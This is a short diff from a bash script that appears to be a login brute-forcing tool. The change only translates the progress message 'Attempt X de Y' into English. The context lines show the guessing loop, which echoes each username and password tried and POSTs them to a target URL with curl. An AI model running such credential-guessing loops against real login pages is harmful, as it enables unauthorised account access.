@@ -115,7 +115,7 @@ $C5  ░░░░░         ░░░░░░  ░░░░░     ░░░�
          AT=$(($AT + 1))
          echo -e " User attempt: $LIN_USER"
          echo -e " Password attempt: $LIN_PASS"
-         echo -e " Attempt $C2$AT$F de $C3$TENT$F"
+         echo -e " Attempt $C2$AT$F of $C3$TENT$F"
          echo -e " $C4$ENC$F found."
 
          curl -s -c cookie.txt -d "$USER=$LIN_USER&password=$LIN_PASS&OTHER_PARAM" $URL 2>&- >&-
